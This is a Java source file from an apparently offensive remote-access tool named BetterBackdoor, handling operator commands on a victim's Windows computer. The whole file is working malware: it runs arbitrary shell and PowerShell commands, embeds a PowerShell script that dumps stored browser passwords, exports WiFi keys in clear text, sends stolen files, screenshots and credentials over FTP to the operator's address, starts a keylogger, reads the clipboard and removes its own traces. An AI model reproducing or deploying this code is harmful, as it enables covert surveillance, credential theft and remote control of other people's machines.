package com.thatcherdev.betterbackdoor.backdoor;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Scanner;

import javax.imageio.ImageIO;

import com.thatcherdev.betterbackdoor.backend.DuckyScripts;
import com.thatcherdev.betterbackdoor.backend.FTP;
import com.thatcherdev.betterbackdoor.backend.KeyLogger;
import com.thatcherdev.betterbackdoor.backend.Utils;

import org.apache.commons.io.FileUtils;

public class HandleCommand {

	/**
	 * Handles command.
	 * <p>
	 * Handles command {@link command} and sets {@link send} to an appropriate
	 * response. Uses {@link Backdoor#out} to send the response followed by a token
	 * to signal the end of the response.
	 *
	 * @param command command given to the backdoor
	 */
	public static void handle(String command) {
		String send = "";
		if (command.equals("help"))
			send = "[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
					+ "[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
					+ "[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get a screenshot of vitim's computer\n"
					+ "[cb] Get text currently copied to victim's clipboard\n[cat] Get contents of a file on victim's computer\n"
					+ "[zip] Compress a directory to a ZIP file\n[unzip] Decompress a ZIP file\n"
					+ "[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit";
		else if (command.startsWith("cmd"))
			send = Utils.runCommand(command.substring(4));
		else if (command.startsWith("ps") || command.startsWith("ds")) {
			File file = new File(command.substring(3));
			try {
				if (command.startsWith("ps") && file.exists())
					send = Utils.runPSScript(command.substring(3));
				else if (command.startsWith("ds") && file.exists() && DuckyScripts.run(command.substring(3)))
					send = "DuckyScript successfully executed";
				else
					throw new Exception();
			} catch (Exception e) {
				send = "An error occurred when trying to execute script";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			} finally {
				try {
					FileUtils.forceDelete(file);
				} catch (Exception e) {
				}
			}
		} else if (command.startsWith("exfiles")) {
			File exfiltratedFiles = new File(Backdoor.gatheredDir + "ExfiltratedFiles");
			try {
				Utils.exfilFiles(command.substring(command.indexOf(" "), command.indexOf("*")),
						new ArrayList<String>(Arrays.asList(command.substring(command.indexOf("*") + 1).split(","))));
				Utils.zipDir(exfiltratedFiles.getAbsolutePath());
				FTP.backdoor(exfiltratedFiles.getAbsolutePath() + ".zip", "send", Backdoor.ip);
				while (!FTP.socketTransferDone && FTP.error == null)
					Thread.sleep(10);
				if (FTP.socketTransferDone)
					FTP.socketTransferDone = false;
				if (FTP.error != null) {
					String error = FTP.error;
					FTP.error = null;
					throw new Exception(error);
				}
				send = "Files exfiltrated";
			} catch (Exception e) {
				send = "An error occurred when trying to exfiltrate files";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			} finally {
				try {
					FileUtils.forceDelete(exfiltratedFiles);
					FileUtils.forceDelete(new File(exfiltratedFiles.getAbsolutePath() + ".zip"));
				} catch (Exception e) {
				}
			}
		} else if (command.equals("expass")) {
			File exfiltratedPasswords = new File(Backdoor.gatheredDir + "ExfiltratedPasswords");
			try {
				exfiltratedPasswords.mkdir();
				File exfilBrowserCredsScript = new File(
						exfiltratedPasswords.getAbsolutePath() + File.separator + "ExfilBrowserCreds.ps1");
				PrintWriter out = new PrintWriter(exfilBrowserCredsScript);
				out.println("$filename=$PSScriptRoot+\"\\BrowserPasswords.txt\"\n"
						+ "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n"
						+ "$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()\n"
						+ "foreach ($c in $creds) {$c.RetrievePassword()}\n"
						+ "$creds | Format-List -Property Resource,UserName,Password | Out-File $filename\n" + "exit");
				out.flush();
				out.close();
				Utils.runPSScript(exfilBrowserCredsScript.getAbsolutePath());
				Utils.runCommand(
						"netsh wlan export profile key=clear folder=" + exfiltratedPasswords.getAbsolutePath());
				FileUtils.forceDelete(exfilBrowserCredsScript);
				Utils.zipDir(exfiltratedPasswords.getAbsolutePath());
				FTP.backdoor(exfiltratedPasswords.getAbsolutePath() + ".zip", "send", Backdoor.ip);
				while (!FTP.socketTransferDone && FTP.error == null)
					Thread.sleep(10);
				if (FTP.socketTransferDone)
					FTP.socketTransferDone = false;
				if (FTP.error != null) {
					String error = FTP.error;
					FTP.error = null;
					throw new Exception(error);
				}
				send = "Passwords exfiltrated";
			} catch (Exception e) {
				send = "An error occurred when trying to exfiltrate passwords";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			} finally {
				try {
					FileUtils.forceDelete(exfiltratedPasswords);
					FileUtils.forceDelete(new File(exfiltratedPasswords.getAbsolutePath() + ".zip"));
				} catch (Exception e) {
				}
			}
		} else if (command.startsWith("filetype")) {
			File file = new File(command.substring(9));
			if (file.isFile())
				send = "file";
			else if (file.isDirectory())
				send = "directory";
			else
				send = "not real";
		} else if (command.startsWith("filesend")) {
			try {
				FTP.backdoor(command.substring(9), "rec", Backdoor.ip);
				while (!FTP.socketTransferDone && FTP.error == null)
					Thread.sleep(10);
				if (FTP.socketTransferDone)
					FTP.socketTransferDone = false;
				if (FTP.error != null) {
					String error = FTP.error;
					FTP.error = null;
					throw new Exception(error);
				}
				send = "File sent";
			} catch (Exception e) {
				send = "An error occurred when trying to send file";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		} else if (command.startsWith("filerec")) {
			File file = new File(command.substring(8));
			try {
				if (file.isFile())
					FTP.backdoor(file.getAbsolutePath(), "send", Backdoor.ip);
				else if (file.isDirectory()) {
					Utils.zipDir(file.getAbsolutePath());
					FTP.backdoor(file.getAbsolutePath() + ".zip", "send", Backdoor.ip);
				}

				while (!FTP.socketTransferDone && FTP.error == null)
					Thread.sleep(10);
				if (FTP.socketTransferDone)
					FTP.socketTransferDone = false;
				if (FTP.error != null) {
					String error = FTP.error;
					FTP.error = null;
					throw new Exception(error);
				}
				send = "File received";
			} catch (Exception e) {
				send = "An error occurred when trying to receive file";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			} finally {
				try {
					if (file.isDirectory())
						FileUtils.forceDelete(new File(file.getAbsolutePath() + ".zip"));
				} catch (Exception e) {
				}
			}
		} else if (command.startsWith("keylog")) {
			Thread keyLogger = new Thread() {
				public void run() {
					KeyLogger.start(command.substring(7));
				}
			};
			keyLogger.start();
			send = "Keys are being logged to '" + command.substring(7) + "\\keys.log' on victim's computer";
		} else if (command.equals("ss")) {
			File screenshot = new File(Backdoor.gatheredDir + "screenshot.png");
			try {
				ImageIO.write(
						new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())),
						"png", screenshot);
				FTP.backdoor(screenshot.getAbsolutePath(), "send", Backdoor.ip);
				while (!FTP.socketTransferDone && FTP.error == null)
					Thread.sleep(10);
				if (FTP.socketTransferDone)
					FTP.socketTransferDone = false;
				if (FTP.error != null) {
					String error = FTP.error;
					FTP.error = null;
					throw new Exception(error);
				}
				send = "Screenshot received";
			} catch (Exception e) {
				send = "An error occurred when trying to receive screenshot";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			} finally {
				try {
					FileUtils.forceDelete(screenshot);
				} catch (IOException e) {
				}
			}
		} else if (command.equals("cb"))
			try {
				String clipBoard = (String) Toolkit.getDefaultToolkit().getSystemClipboard()
						.getData(DataFlavor.stringFlavor);
				if (clipBoard.isEmpty())
					send = "Nothing copied to victim's clipboard";
				else
					send = "Victim's clipboard:\n" + clipBoard;
			} catch (Exception e) {
				send = "An error occurred when trying to get victim's clipboard";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (command.startsWith("cat"))
			try {
				Scanner in = new Scanner(new File(command.substring(4)));
				while (in.hasNextLine())
					send += in.nextLine() + "\n";
				in.close();
			} catch (Exception e) {
				send = "An error occurred when trying to get file";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (command.startsWith("zip"))
			try {
				File dir = new File(command.substring(4));
				if (!dir.isDirectory())
					throw new Exception("Not a directory");
				Utils.zipDir(dir.getAbsolutePath());
				send = "Directory compressed to '" + dir.getAbsolutePath() + ".zip'";
			} catch (Exception e) {
				send = "An error occurred when compressing directory";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (command.startsWith("unzip"))
			try {
				String output = Utils.unzip(command.substring(6));
				send = "Contents of ZIP file decompressed to '" + output + "'";
			} catch (Exception e) {
				send = "An error occurred when decompressing directory";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (command.equals("remove"))
			try {
				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat && rd /s /q "
						+ Backdoor.gatheredDir + " jre");
				System.exit(0);
			} catch (Exception e) {
				send = "An error occurred when trying to remove files";
				if (e.getMessage() != null)
					send += ":\n" + e.getMessage();
			}
		else if (!command.isEmpty())
			send = "Command not found";
		Backdoor.out.println(send + "\n!$end$!");
	}
}